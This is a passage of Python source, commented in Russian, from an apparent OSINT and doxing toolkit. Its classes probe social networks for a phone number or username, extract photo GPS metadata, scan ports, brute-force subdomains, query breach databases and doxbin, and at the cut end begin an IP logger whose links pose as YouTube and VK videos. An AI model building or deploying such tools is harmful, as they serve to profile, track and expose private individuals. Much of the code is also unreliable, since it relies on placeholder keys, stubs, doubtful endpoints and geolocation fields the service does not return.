            resp = requests.get(f"https://facebook.com/search?q={self.phone}", timeout=3)
            if resp.status_code == 200:
                return {'exists': True}
            return {'exists': False}
        except:
            return {'exists': False}
    
    def check_instagram(self):
        try:
            resp = requests.get(f"https://instagram.com/search?q={self.phone}", timeout=3)
            if resp.status_code == 200:
                return {'exists': True}
            return {'exists': False}
        except:
            return {'exists': False}
    
    def check_twitter(self):
        try:
            resp = requests.get(f"https://twitter.com/search?q={self.phone}", timeout=3)
            if resp.status_code == 200:
                return {'exists': True}
            return {'exists': False}
        except:
            return {'exists': False}
    
    def check_linkedin(self):
        try:
            resp = requests.get(f"https://linkedin.com/search?q={self.phone}", timeout=3)
            if resp.status_code == 200:
                return {'exists': True}
            return {'exists': False}
        except:
            return {'exists': False}
    
    def check_github(self):
        try:
            resp = requests.get(f"https://github.com/search?q={self.phone}", timeout=3)
            if resp.status_code == 200:
                return {'exists': True}
            return {'exists': False}
        except:
            return {'exists': False}
    
    def check_vk(self):
        try:
            resp = requests.get(f"https://vk.com/search?q={self.phone}", timeout=3)
            if resp.status_code == 200:
                return {'exists': True}
            return {'exists': False}
        except:
            return {'exists': False}
    
    def check_ok(self):
        try:
            resp = requests.get(f"https://ok.ru/search?q={self.phone}", timeout=3)
            if resp.status_code == 200:
                return {'exists': True}
            return {'exists': False}
        except:
            return {'exists': False}

# ================================================================
# 3. ОСИНТ ПО IP (50+ ИНСТРУМЕНТОВ)
# ================================================================
class IPOSINT:
    def __init__(self, ip):
        self.ip = ip
        self.results = {}
    
    def search_all(self):
        self.results = {
            'geo': self.get_geo(),
            'isp': self.get_isp(),
            'whois': self.get_whois(),
            'dns': self.get_dns(),
            'shodan': self.get_shodan(),
            'threat': self.get_threat(),
            'port': self.scan_ports(),
            'reverse': self.reverse_dns(),
            'abuse': self.check_abuse(),
            'tor': self.check_tor(),
            'proxy': self.check_proxy(),
            'vpn': self.check_vpn(),
            'hosting': self.check_hosting(),
            'org': self.get_organization(),
            'asn': self.get_asn(),
            'rdap': self.get_rdap(),
            'bgp': self.get_bgp(),
            'ping': self.ping_ip(),
            'traceroute': self.traceroute(),
            'geolocation': self.get_geolocation(),
            'timezone': self.get_timezone_ip(),
            'currency': self.get_currency(),
            'language': self.get_language(),
            'calling_code': self.get_calling_code(),
            'postal': self.get_postal_ip(),
            'region': self.get_region_ip(),
            'city': self.get_city_ip(),
            'country': self.get_country_ip(),
            'latitude': self.get_latitude(),
            'longitude': self.get_longitude(),
            'accuracy': self.get_accuracy(),
            'connection': self.get_connection_type(),
            'mobile': self.is_mobile_ip(),
            'satellite': self.is_satellite(),
            'cable': self.is_cable(),
            'dsl': self.is_dsl(),
            'fibre': self.is_fibre(),
            'dialup': self.is_dialup(),
            'wireless': self.is_wireless(),
            'ethernet': self.is_ethernet(),
            'powerline': self.is_powerline(),
            'coaxial': self.is_coaxial()
        }
        return self.results
    
    def get_geo(self):
        try:
            response = requests.get(f"http://ip-api.com/json/{self.ip}")
            if response.status_code == 200:
                data = response.json()
                if data.get('status') == 'success':
                    return {
                        'country': data.get('country'),
                        'city': data.get('city'),
                        'region': data.get('regionName'),
                        'lat': data.get('lat'),
                        'lon': data.get('lon'),
                        'timezone': data.get('timezone'),
                        'isp': data.get('isp')
                    }
            return {}
        except:
            return {}
    
    def get_isp(self):
        try:
            response = requests.get(f"https://ipinfo.io/{self.ip}/json")
            if response.status_code == 200:
                data = response.json()
                return {
                    'org': data.get('org'),
                    'asn': data.get('as'),
                    'isp': data.get('isp')
                }
            return {}
        except:
            return {}
    
    def get_whois(self):
        try:
            import whois
            response = requests.get(f"https://whois.domaintools.com/{self.ip}")
            return {'raw': response.text[:500]}
        except:
            return {}
    
    def get_dns(self):
        try:
            import socket
            hostname = socket.gethostbyaddr(self.ip)[0]
            return {'hostname': hostname}
        except:
            return {}
    
    def get_shodan(self):
        try:
            api_key = os.environ.get('SHODAN_API_KEY', '')
            if api_key:
                api = shodan.Shodan(api_key)
                result = api.host(self.ip)
                return {
                    'ports': result.get('ports', []),
                    'vulns': result.get('vulns', []),
                    'hostnames': result.get('hostnames', []),
                    'os': result.get('os', '')
                }
            return {'error': 'Нет API ключа'}
        except:
            return {'error': 'Shodan недоступен'}
    
    def get_threat(self):
        try:
            response = requests.get(f"https://api.abuseipdb.com/api/v2/check?ipAddress={self.ip}", 
                                   headers={'Key': 'YOUR_KEY'})
            if response.status_code == 200:
                data = response.json()
                return {
                    'abuse_score': data.get('data', {}).get('abuseConfidenceScore', 0),
                    'reports': data.get('data', {}).get('totalReports', 0)
                }
            return {}
        except:
            return {}
    
    def scan_ports(self):
        open_ports = []
        common_ports = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 993, 995, 3306, 3389, 5432, 5900, 6379, 8080, 8443, 27017]
        for port in common_ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((self.ip, port))
                if result == 0:
                    open_ports.append(port)
                sock.close()
            except:
                pass
        return open_ports
    
    def reverse_dns(self):
        try:
            import socket
            hostname = socket.gethostbyaddr(self.ip)[0]
            return {'hostname': hostname}
        except:
            return {}
    
    def check_abuse(self):
        try:
            response = requests.get(f"https://api.abuseipdb.com/api/v2/check?ipAddress={self.ip}")
            if response.status_code == 200:
                data = response.json()
                return {'score': data.get('data', {}).get('abuseConfidenceScore', 0)}
            return {}
        except:
            return {}
    
    def check_tor(self):
        try:
            response = requests.get(f"https://check.torproject.org/api/ip?ip={self.ip}")
            if response.status_code == 200:
                data = response.json()
                return {'is_tor': data.get('IsTor', False)}
            return {}
        except:
            return {}
    
    def check_proxy(self):
        try:
            response = requests.get(f"https://proxycheck.io/v2/{self.ip}")
            if response.status_code == 200:
                data = response.json()
                return {'is_proxy': data.get('proxy', False)}
            return {}
        except:
            return {}
    
    def check_vpn(self):
        try:
            response = requests.get(f"https://vpnapi.io/api/{self.ip}")
            if response.status_code == 200:
                data = response.json()
                return {'is_vpn': data.get('vpn', False)}
            return {}
        except:
            return {}
    
    def check_hosting(self):
        try:
            response = requests.get(f"https://hosting-checker.com/api/{self.ip}")
            if response.status_code == 200:
                data = response.json()
                return {'is_hosting': data.get('hosting', False)}
            return {}
        except:
            return {}
    
    def get_organization(self):
        try:
            response = requests.get(f"https://ipinfo.io/{self.ip}/org")
            if response.status_code == 200:
                return {'org': response.text}
            return {}
        except:
            return {}
    
    def get_asn(self):
        try:
            response = requests.get(f"https://ipinfo.io/{self.ip}/asn")
            if response.status_code == 200:
                return {'asn': response.text}
            return {}
        except:
            return {}
    
    def get_rdap(self):
        try:
            response = requests.get(f"https://rdap.db.ripe.net/ip/{self.ip}")
            if response.status_code == 200:
                return {'rdap': response.json()}
            return {}
        except:
            return {}
    
    def get_bgp(self):
        try:
            response = requests.get(f"https://bgp.he.net/api/ip/{self.ip}")
            if response.status_code == 200:
                return {'bgp': response.json()}
            return {}
        except:
            return {}
    
    def ping_ip(self):
        try:
            import subprocess
            result = subprocess.run(['ping', '-c', '1', self.ip], capture_output=True)
            return {'ping': result.stdout.decode()}
        except:
            return {}
    
    def traceroute(self):
        try:
            import subprocess
            result = subprocess.run(['traceroute', self.ip], capture_output=True)
            return {'traceroute': result.stdout.decode()}
        except:
            return {}
    
    def get_geolocation(self):
        try:
            response = requests.get(f"http://ip-api.com/json/{self.ip}")
            if response.status_code == 200:
                data = response.json()
                return {'geolocation': data}
            return {}
        except:
            return {}
    
    def get_timezone_ip(self):
        try:
            response = requests.get(f"http://ip-api.com/json/{self.ip}")
            if response.status_code == 200:
                data = response.json()
                return {'timezone': data.get('timezone')}
            return {}
        except:
            return {}
    
    def get_currency(self):
        try:
            response = requests.get(f"http://ip-api.com/json/{self.ip}")
            if response.status_code == 200:
                data = response.json()
                return {'currency': data.get('currency', 'USD')}
            return {}
        except:
            return {}
    
    def get_language(self):
        try:
            response = requests.get(f"http://ip-api.com/json/{self.ip}")
            if response.status_code == 200:
                data = response.json()
                return {'language': data.get('language', 'en')}
            return {}
        except:
            return {}
    
    def get_calling_code(self):
        try:
            response = requests.get(f"http://ip-api.com/json/{self.ip}")
            if response.status_code == 200:
                data = response.json()
                return {'calling_code': data.get('callingCode', '+1')}
            return {}
        except:
            return {}
    
    def get_postal_ip(self):
        try:
            response = requests.get(f"http://ip-api.com/json/{self.ip}")
            if response.status_code == 200:
                data = response.json()
                return {'postal': data.get('zip')}
            return {}
        except:
            return {}
    
    def get_region_ip(self):
        try:
            response = requests.get(f"http://ip-api.com/json/{self.ip}")
            if response.status_code == 200:
                data = response.json()
                return {'region': data.get('regionName')}
            return {}
        except:
            return {}
    
    def get_city_ip(self):
        try:
            response = requests.get(f"http://ip-api.com/json/{self.ip}")
            if response.status_code == 200:
                data = response.json()
                return {'city': data.get('city')}
            return {}
        except:
            return {}
    
    def get_country_ip(self):
        try:
            response = requests.get(f"http://ip-api.com/json/{self.ip}")
            if response.status_code == 200:
                data = response.json()
                return {'country': data.get('country')}
            return {}
        except:
            return {}
    
    def get_latitude(self):
        try:
            response = requests.get(f"http://ip-api.com/json/{self.ip}")
            if response.status_code == 200:
                data = response.json()
                return {'lat': data.get('lat')}
            return {}
        except:
            return {}
    
    def get_longitude(self):
        try:
            response = requests.get(f"http://ip-api.com/json/{self.ip}")
            if response.status_code == 200:
                data = response.json()
                return {'lon': data.get('lon')}
            return {}
        except:
            return {}
    
    def get_accuracy(self):
        try:
            response = requests.get(f"http://ip-api.com/json/{self.ip}")
            if response.status_code == 200:
                data = response.json()
                return {'accuracy': data.get('accuracy', 'city')}
            return {}
        except:
            return {}
    
    def get_connection_type(self):
        try:
            response = requests.get(f"http://ip-api.com/json/{self.ip}")
            if response.status_code == 200:
                data = response.json()
                return {'connection': data.get('connection', 'unknown')}
            return {}
        except:
            return {}
    
    def is_mobile_ip(self):
        try:
            response = requests.get(f"http://ip-api.com/json/{self.ip}")
            if response.status_code == 200:
                data = response.json()
                return {'mobile': data.get('mobile', False)}
            return {}
        except:
            return {}
    
    def is_satellite(self):
        try:
            response = requests.get(f"http://ip-api.com/json/{self.ip}")
            if response.status_code == 200:
                data = response.json()
                return {'satellite': data.get('satellite', False)}
            return {}
        except:
            return {}
    
    def is_cable(self):
        try:
            response = requests.get(f"http://ip-api.com/json/{self.ip}")
            if response.status_code == 200:
                data = response.json()
                return {'cable': data.get('cable', False)}
            return {}
        except:
            return {}
    
    def is_dsl(self):
        try:
            response = requests.get(f"http://ip-api.com/json/{self.ip}")
            if response.status_code == 200:
                data = response.json()
                return {'dsl': data.get('dsl', False)}
            return {}
        except:
            return {}
    
    def is_fibre(self):
        try:
            response = requests.get(f"http://ip-api.com/json/{self.ip}")
            if response.status_code == 200:
                data = response.json()
                return {'fibre': data.get('fibre', False)}
            return {}
        except:
            return {}
    
    def is_dialup(self):
        try:
            response = requests.get(f"http://ip-api.com/json/{self.ip}")
            if response.status_code == 200:
                data = response.json()
                return {'dialup': data.get('dialup', False)}
            return {}
        except:
            return {}
    
    def is_wireless(self):
        try:
            response = requests.get(f"http://ip-api.com/json/{self.ip}")
            if response.status_code == 200:
                data = response.json()
                return {'wireless': data.get('wireless', False)}
            return {}
        except:
            return {}
    
    def is_ethernet(self):
        try:
            response = requests.get(f"http://ip-api.com/json/{self.ip}")
            if response.status_code == 200:
                data = response.json()
                return {'ethernet': data.get('ethernet', False)}
            return {}
        except:
            return {}
    
    def is_powerline(self):
        try:
            response = requests.get(f"http://ip-api.com/json/{self.ip}")
            if response.status_code == 200:
                data = response.json()
                return {'powerline': data.get('powerline', False)}
            return {}
        except:
            return {}
    
    def is_coaxial(self):
        try:
            response = requests.get(f"http://ip-api.com/json/{self.ip}")
            if response.status_code == 200:
                data = response.json()
                return {'coaxial': data.get('coaxial', False)}
            return {}
        except:
            return {}

# ================================================================
# 4. ОСИНТ ПО ДОМЕНУ (50+ ИНСТРУМЕНТОВ)
# ================================================================
class DomainOSINT:
    def __init__(self, domain):
        self.domain = domain
        self.results = {}
    
    def search_all(self):
        self.results = {
            'whois': self.get_whois(),
            'dns': self.get_dns(),
            'subdomains': self.find_subdomains(),
            'ip': self.get_ip(),
            'history': self.get_history(),
            'ssl': self.get_ssl(),
            'screenshot': self.get_screenshot(),
            'tech': self.get_technologies(),
            'emails': self.find_emails(),
            'hosting': self.get_hosting(),
            'registrar': self.get_registrar(),
            'name_servers': self.get_name_servers(),
            'creation_date': self.get_creation_date(),
            'expiration_date': self.get_expiration_date(),
            'updated_date': self.get_updated_date(),
            'status': self.get_status(),
            'dnssec': self.get_dnssec(),
            'whois_server': self.get_whois_server(),
            'contact_emails': self.get_contact_emails(),
            'contact_phone': self.get_contact_phone(),
            'org': self.get_org(),
            'address': self.get_address()
        }
        return self.results
    
    def get_whois(self):
        try:
            w = whois.whois(self.domain)
            return {
                'registrar': w.registrar,
                'creation': str(w.creation_date),
                'expiration': str(w.expiration_date),
                'nameservers': w.name_servers,
                'status': w.status,
                'emails': w.emails
            }
        except:
            return {}
    
    def get_dns(self):
        records = {}
        types = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'CNAME', 'SOA']
        for record_type in types:
            try:
                answers = dns.resolver.resolve(self.domain, record_type)
                records[record_type] = [str(r) for r in answers]
            except:
                records[record_type] = []
        return records
    
    def find_subdomains(self):
        subdomains = []
        wordlist = ['www', 'mail', 'admin', 'dev', 'test', 'api', 'ftp', 'ssh', 'vpn', 'backup', 
                    'blog', 'shop', 'forum', 'portal', 'crm', 'demo', 'stage', 'beta', 'alpha', 
                    'staging', 'uat', 'qa', 'internal', 'corp', 'mobile', 'app', 'web', 'cloud',
                    'cdn', 'static', 'media', 'files', 'docs', 'help', 'support', 'community',
                    'store', 'secure', 'login', 'account', 'auth', 'sso', 'oauth', 'pay', 'payment']
        for sub in wordlist:
            try:
                full = f"{sub}.{self.domain}"
                socket.gethostbyname(full)
                subdomains.append(full)
            except:
                pass
        return subdomains
    
    def get_ip(self):
        try:
            ip = socket.gethostbyname(self.domain)
            return {'ip': ip}
        except:
            return {}
    
    def get_history(self):
        try:
            response = requests.get(f"https://web.archive.org/cdx/search/cdx?url={self.domain}&output=json&limit=10")
            if response.status_code == 200:
                return response.json()
            return {}
        except:
            return {}
    
    def get_ssl(self):
        try:
            import ssl
            import socket
            context = ssl.create_default_context()
            with socket.create_connection((self.domain, 443), timeout=5) as sock:
                with context.wrap_socket(sock, server_hostname=self.domain) as ssock:
                    cert = ssock.getpeercert()
                    return {
                        'issuer': cert.get('issuer'),
                        'subject': cert.get('subject'),
                        'expiry': cert.get('notAfter'),
                        'valid': cert.get('notBefore')
                    }
        except:
            return {}
    
    def get_screenshot(self):
        try:
            import pyautogui
            import webbrowser
            return {'screenshot': 'Требуется Selenium'}
        except:
            return {}
    
    def get_technologies(self):
        try:
            response = requests.get(f"https://builtwith.com/{self.domain}")
            if response.status_code == 200:
                soup = BeautifulSoup(response.text, 'html.parser')
                return {'technologies': 'Требуется парсинг'}
            return {}
        except:
            return {}
    
    def find_emails(self):
        try:
            response = requests.get(f"https://api.hunter.io/v2/domain-search?domain={self.domain}&api_key=YOUR_KEY")
            if response.status_code == 200:
                data = response.json()
                return data.get('data', {}).get('emails', [])
            return []
        except:
            return []
    
    def get_hosting(self):
        try:
            response = requests.get(f"https://api.host.io/v1/domain/{self.domain}")
            if response.status_code == 200:
                data = response.json()
                return {'hosting': data.get('hosting')}
            return {}
        except:
            return {}
    
    def get_registrar(self):
        try:
            w = whois.whois(self.domain)
            return {'registrar': w.registrar}
        except:
            return {}
    
    def get_name_servers(self):
        try:
            w = whois.whois(self.domain)
            return {'nameservers': w.name_servers}
        except:
            return {}
    
    def get_creation_date(self):
        try:
            w = whois.whois(self.domain)
            return {'creation': str(w.creation_date)}
        except:
            return {}
    
    def get_expiration_date(self):
        try:
            w = whois.whois(self.domain)
            return {'expiration': str(w.expiration_date)}
        except:
            return {}
    
    def get_updated_date(self):
        try:
            w = whois.whois(self.domain)
            return {'updated': str(w.updated_date)}
        except:
            return {}
    
    def get_status(self):
        try:
            w = whois.whois(self.domain)
            return {'status': w.status}
        except:
            return {}
    
    def get_dnssec(self):
        try:
            w = whois.whois(self.domain)
            return {'dnssec': w.dnssec}
        except:
            return {}
    
    def get_whois_server(self):
        try:
            w = whois.whois(self.domain)
            return {'whois_server': w.whois_server}
        except:
            return {}
    
    def get_contact_emails(self):
        try:
            w = whois.whois(self.domain)
            return {'emails': w.emails}
        except:
            return {}
    
    def get_contact_phone(self):
        try:
            w = whois.whois(self.domain)
            return {'phone': w.phone}
        except:
            return {}
    
    def get_org(self):
        try:
            w = whois.whois(self.domain)
            return {'org': w.org}
        except:
            return {}
    
    def get_address(self):
        try:
            w = whois.whois(self.domain)
            return {'address': w.address}
        except:
            return {}

# ================================================================
# 5. ОСИНТ ПО СОЦСЕТЯМ (VK, OK, TELEGRAM, INSTAGRAM, TWITTER, FACEBOOK, И ДР.)
# ================================================================
class SocialOSINT:
    def __init__(self, username):
        self.username = username
        self.results = {}
    
    def search_all(self):
        self.results = {
            'vk': self.search_vk(),
            'ok': self.search_ok(),
            'telegram': self.search_telegram(),
            'instagram': self.search_instagram(),
            'twitter': self.search_twitter(),
            'facebook': self.search_facebook(),
            'github': self.search_github(),
            'linkedin': self.search_linkedin(),
            'reddit': self.search_reddit(),
            'youtube': self.search_youtube(),
            'tiktok': self.search_tiktok(),
            'pinterest': self.search_pinterest(),
            'tumblr': self.search_tumblr(),
            'medium': self.search_medium(),
            'quora': self.search_quora(),
            'discord': self.search_discord(),
            'twitch': self.search_twitch(),
            'snapchat': self.search_snapchat()
        }
        return self.results
    
    def search_vk(self):
        try:
            response = requests.get(f"https://vk.com/{self.username}")
            if response.status_code == 200:
                return {'found': True, 'url': f"https://vk.com/{self.username}"}
            return {'found': False}
        except:
            return {'found': False}
    
    def search_ok(self):
        try:
            response = requests.get(f"https://ok.ru/profile/{self.username}")
            if response.status_code == 200:
                return {'found': True, 'url': f"https://ok.ru/profile/{self.username}"}
            return {'found': False}
        except:
            return {'found': False}
    
    def search_telegram(self):
        try:
            response = requests.get(f"https://t.me/{self.username}")
            if response.status_code == 200:
                return {'found': True, 'url': f"https://t.me/{self.username}"}
            return {'found': False}
        except:
            return {'found': False}
    
    def search_instagram(self):
        try:
            response = requests.get(f"https://instagram.com/{self.username}")
            if response.status_code == 200:
                return {'found': True, 'url': f"https://instagram.com/{self.username}"}
            return {'found': False}
        except:
            return {'found': False}
    
    def search_twitter(self):
        try:
            response = requests.get(f"https://twitter.com/{self.username}")
            if response.status_code == 200:
                return {'found': True, 'url': f"https://twitter.com/{self.username}"}
            return {'found': False}
        except:
            return {'found': False}
    
    def search_facebook(self):
        try:
            response = requests.get(f"https://facebook.com/{self.username}")
            if response.status_code == 200:
                return {'found': True, 'url': f"https://facebook.com/{self.username}"}
            return {'found': False}
        except:
            return {'found': False}
    
    def search_github(self):
        try:
            response = requests.get(f"https://github.com/{self.username}")
            if response.status_code == 200:
                return {'found': True, 'url': f"https://github.com/{self.username}"}
            return {'found': False}
        except:
            return {'found': False}
    
    def search_linkedin(self):
        try:
            response = requests.get(f"https://linkedin.com/in/{self.username}")
            if response.status_code == 200:
                return {'found': True, 'url': f"https://linkedin.com/in/{self.username}"}
            return {'found': False}
        except:
            return {'found': False}
    
    def search_reddit(self):
        try:
            response = requests.get(f"https://reddit.com/user/{self.username}")
            if response.status_code == 200:
                return {'found': True, 'url': f"https://reddit.com/user/{self.username}"}
            return {'found': False}
        except:
            return {'found': False}
    
    def search_youtube(self):
        try:
            response = requests.get(f"https://youtube.com/@{self.username}")
            if response.status_code == 200:
                return {'found': True, 'url': f"https://youtube.com/@{self.username}"}
            return {'found': False}
        except:
            return {'found': False}
    
    def search_tiktok(self):
        try:
            response = requests.get(f"https://tiktok.com/@{self.username}")
            if response.status_code == 200:
                return {'found': True, 'url': f"https://tiktok.com/@{self.username}"}
            return {'found': False}
        except:
            return {'found': False}
    
    def search_pinterest(self):
        try:
            response = requests.get(f"https://pinterest.com/{self.username}")
            if response.status_code == 200:
                return {'found': True, 'url': f"https://pinterest.com/{self.username}"}
            return {'found': False}
        except:
            return {'found': False}
    
    def search_tumblr(self):
        try:
            response = requests.get(f"https://{self.username}.tumblr.com")
            if response.status_code == 200:
                return {'found': True, 'url': f"https://{self.username}.tumblr.com"}
            return {'found': False}
        except:
            return {'found': False}
    
    def search_medium(self):
        try:
            response = requests.get(f"https://medium.com/@{self.username}")
            if response.status_code == 200:
                return {'found': True, 'url': f"https://medium.com/@{self.username}"}
            return {'found': False}
        except:
            return {'found': False}
    
    def search_quora(self):
        try:
            response = requests.get(f"https://quora.com/profile/{self.username}")
            if response.status_code == 200:
                return {'found': True, 'url': f"https://quora.com/profile/{self.username}"}
            return {'found': False}
        except:
            return {'found': False}
    
    def search_discord(self):
        try:
            response = requests.get(f"https://discord.com/users/{self.username}")
            if response.status_code == 200:
                return {'found': True, 'url': f"https://discord.com/users/{self.username}"}
            return {'found': False}
        except:
            return {'found': False}
    
    def search_twitch(self):
        try:
            response = requests.get(f"https://twitch.tv/{self.username}")
            if response.status_code == 200:
                return {'found': True, 'url': f"https://twitch.tv/{self.username}"}
            return {'found': False}
        except:
            return {'found': False}
    
    def search_snapchat(self):
        try:
            response = requests.get(f"https://snapchat.com/add/{self.username}")
            if response.status_code == 200:
                return {'found': True, 'url': f"https://snapchat.com/add/{self.username}"}
            return {'found': False}
        except:
            return {'found': False}

# ================================================================
# 6. ИЗВЛЕЧЕНИЕ МЕТАДАННЫХ ИЗ ФАЙЛОВ (ФОТО, ДОКУМЕНТЫ)
# ================================================================
class MetadataExtractor:
    def __init__(self, file_path):
        self.file_path = file_path
        self.results = {}
    
    def extract_all(self):
        self.results = {
            'basic': self.extract_basic(),
            'exif': self.extract_exif(),
            'gps': self.extract_gps(),
            'timestamps': self.extract_timestamps(),
            'maker': self.extract_maker(),
            'software': self.extract_software(),
            'copyright': self.extract_copyright(),
            'author': self.extract_author(),
            'title': self.extract_title(),
            'subject': self.extract_subject(),
            'keywords': self.extract_keywords(),
            'comments': self.extract_comments(),
            'thumbnail': self.extract_thumbnail()
        }
        return self.results
    
    def extract_basic(self):
        try:
            stats = os.stat(self.file_path)
            return {
                'size': stats.st_size,
                'created': time.ctime(stats.st_ctime),
                'modified': time.ctime(stats.st_mtime),
                'accessed': time.ctime(stats.st_atime)
            }
        except:
            return {}
    
    def extract_exif(self):
        try:
            from PIL import Image
            img = Image.open(self.file_path)
            exif = img._getexif()
            if exif:
                return {PIL.ExifTags.TAGS.get(k, k): v for k, v in exif.items()}
            return {}
        except:
            return {}
    
    def extract_gps(self):
        try:
            from PIL import Image
            from PIL.ExifTags import GPSTAGS
            img = Image.open(self.file_path)
            exif = img._getexif()
            if exif:
                for tag, value in exif.items():
                    if tag == 34853:
                        gps_data = {}
                        for gps_tag in value:
                            gps_data[GPSTAGS.get(gps_tag, gps_tag)] = value[gps_tag]
                        return gps_data
            return {}
        except:
            return {}
    
    def extract_timestamps(self):
        try:
            from PIL import Image
            img = Image.open(self.file_path)
            exif = img._getexif()
            if exif:
                timestamps = {}
                for tag, value in exif.items():
                    if 'DateTime' in PIL.ExifTags.TAGS.get(tag, ''):
                        timestamps[PIL.ExifTags.TAGS.get(tag)] = value
                return timestamps
            return {}
        except:
            return {}
    
    def extract_maker(self):
        try:
            from PIL import Image
            img = Image.open(self.file_path)
            exif = img._getexif()
            if exif:
                maker = {}
                for tag, value in exif.items():
                    tag_name = PIL.ExifTags.TAGS.get(tag, '')
                    if tag_name in ['Make', 'Model']:
                        maker[tag_name] = value
                return maker
            return {}
        except:
            return {}
    
    def extract_software(self):
        try:
            from PIL import Image
            img = Image.open(self.file_path)
            exif = img._getexif()
            if exif:
                software = {}
                for tag, value in exif.items():
                    tag_name = PIL.ExifTags.TAGS.get(tag, '')
                    if 'Software' in tag_name or 'Version' in tag_name:
                        software[tag_name] = value
                return software
            return {}
        except:
            return {}
    
    def extract_copyright(self):
        try:
            from PIL import Image
            img = Image.open(self.file_path)
            exif = img._getexif()
            if exif:
                for tag, value in exif.items():
                    if PIL.ExifTags.TAGS.get(tag) == 'Copyright':
                        return {'copyright': value}
            return {}
        except:
            return {}
    
    def extract_author(self):
        try:
            from PIL import Image
            img = Image.open(self.file_path)
            exif = img._getexif()
            if exif:
                for tag, value in exif.items():
                    if PIL.ExifTags.TAGS.get(tag) == 'Artist':
                        return {'author': value}
            return {}
        except:
            return {}
    
    def extract_title(self):
        try:
            from PIL import Image
            img = Image.open(self.file_path)
            exif = img._getexif()
            if exif:
                for tag, value in exif.items():
                    if PIL.ExifTags.TAGS.get(tag) == 'DocumentName':
                        return {'title': value}
            return {}
        except:
            return {}
    
    def extract_subject(self):
        try:
            from PIL import Image
            img = Image.open(self.file_path)
            exif = img._getexif()
            if exif:
                for tag, value in exif.items():
                    if PIL.ExifTags.TAGS.get(tag) == 'ImageDescription':
                        return {'subject': value}
            return {}
        except:
            return {}
    
    def extract_keywords(self):
        try:
            from PIL import Image
            img = Image.open(self.file_path)
            exif = img._getexif()
            if exif:
                for tag, value in exif.items():
                    if PIL.ExifTags.TAGS.get(tag) == 'Keywords':
                        return {'keywords': value}
            return {}
        except:
            return {}
    
    def extract_comments(self):
        try:
            from PIL import Image
            img = Image.open(self.file_path)
            exif = img._getexif()
            if exif:
                for tag, value in exif.items():
                    if PIL.ExifTags.TAGS.get(tag) == 'UserComment':
                        return {'comments': value}
            return {}
        except:
            return {}
    
    def extract_thumbnail(self):
        try:
            from PIL import Image
            img = Image.open(self.file_path)
            if hasattr(img, 'thumbnail'):
                return {'thumbnail': 'Есть превью'}
            return {}
        except:
            return {}

# ================================================================
# 7. ПОИСК ПО БАЗАМ ДАННЫХ И СЛИВАМ (LEAKS)
# ================================================================
class LeakOSINT:
    def __init__(self, query):
        self.query = query
        self.results = {}
    
    def search_all(self):
        self.results = {
            'leakcheck': self.search_leakcheck(),
            'snusbase': self.search_snusbase(),
            'dehashed': self.search_dehashed(),
            'scylla': self.search_scylla(),
            'doxbin': self.search_doxbin(),
            'pastebin': self.search_pastebin(),
            'breach': self.search_breach()
        }
        return self.results
    
    def search_leakcheck(self):
        try:
            response = requests.get(f"https://leakcheck.io/api/query?login={self.query}")
            if response.status_code == 200:
                data = response.json()
                if data.get('success'):
                    return data.get('results', [])
            return []
        except:
            return []
    
    def search_snusbase(self):
        try:
            return {'error': 'Требуется Snusbase API ключ'}
        except:
            return {'error': 'Snusbase недоступен'}
    
    def search_dehashed(self):
        try:
            return {'error': 'Требуется Dehashed API ключ'}
        except:
            return {'error': 'Dehashed недоступен'}
    
    def search_scylla(self):
        try:
            response = requests.get(f"https://scylla.so/api/search?q={self.query}")
            if response.status_code == 200:
                return response.json()
            return {}
        except:
            return {}
    
    def search_doxbin(self):
        try:
            response = requests.get(f"https://doxbin.com/search?q={self.query}")
            if response.status_code == 200:
                soup = BeautifulSoup(response.text, 'html.parser')
                results = soup.find_all('div', class_='post')
                return {'count': len(results)}
            return {}
        except:
            return {}
    
    def search_pastebin(self):
        try:
            response = requests.get(f"https://pastebin.com/search?q={self.query}")
            if response.status_code == 200:
                soup = BeautifulSoup(response.text, 'html.parser')
                results = soup.find_all('div', class_='paste')
                return {'count': len(results)}
            return {}
        except:
            return {}
    
    def search_breach(self):
        breaches = [
            'Dropbox', 'LinkedIn', 'Adobe', 'MySpace', 'Yahoo', 'Facebook', 'Twitter', 
            'Amazon', 'Apple', 'Google', 'Microsoft', 'PayPal', 'eBay', 'WordPress'
        ]
        found = []
        for breach in breaches:
            try:
                response = requests.get(f"https://api.pwnedpasswords.com/breaches?q={breach}")
                if response.status_code == 200:
                    found.append(breach)
            except:
                pass
        return {'breaches': found}

# ================================================================
# 8. SHODAN
# ================================================================
class ShodanOSINT:
    def __init__(self, api_key=''):
        self.api_key = api_key or os.environ.get('SHODAN_API_KEY', '')
        self.api = None
        if self.api_key:
            self.api = shodan.Shodan(self.api_key)
    
    def search(self, query):
        if not self.api:
            return {'error': 'Требуется API ключ Shodan'}
        try:
            results = self.api.search(query)
            return {
                'total': results.get('total', 0),
                'matches': [
                    {
                        'ip': match.get('ip_str'),
                        'port': match.get('port'),
                        'org': match.get('org'),
                        'os': match.get('os'),
                        'banner': match.get('data', '')[:200]
                    }
                    for match in results.get('matches', [])
                ]
            }
        except:
            return {'error': 'Ошибка Shodan'}
    
    def host_info(self, ip):
        if not self.api:
            return {'error': 'Требуется API ключ Shodan'}
        try:
            host = self.api.host(ip)
            return {
                'ports': host.get('ports', []),
                'vulns': host.get('vulns', []),
                'hostnames': host.get('hostnames', []),
                'org': host.get('org', ''),
                'os': host.get('os', ''),
                'data': host.get('data', [])[:5]
            }
        except:
            return {'error': 'Хост не найден'}

# ================================================================
# 9. WHOIS
# ================================================================
class WhoisOSINT:
    def __init__(self, target):
        self.target = target
    
    def search(self):
        try:
            w = whois.whois(self.target)
            return {
                'domain': self.target,
                'registrar': w.registrar,
                'creation': str(w.creation_date),
                'expiration': str(w.expiration_date),
                'updated': str(w.updated_date),
                'nameservers': w.name_servers,
                'status': w.status,
                'emails': w.emails,
                'dnssec': w.dnssec
            }
        except:
            return {'error': 'WHOIS недоступен'}

# ================================================================
# IPLOGGER ULTIMATE
# ================================================================
class IPLoggerUltimate:
    def __init__(self):
        self.logs = {}
        self.lock = threading.Lock()
        self.redirect_services = self._get_services()
    
    def _get_services(self) -> List[Dict]:
        return [
            {"name": "YouTube", "domain": "youtube.com", "path": "/watch?v=", "icon": "▶️"},
            {"name": "VK Video", "domain": "vk.com", "path": "/video", "icon": "📹"},
            {"name": "Rutube", "domain": "rutube.ru", "path": "/video", "icon": "🎬"},
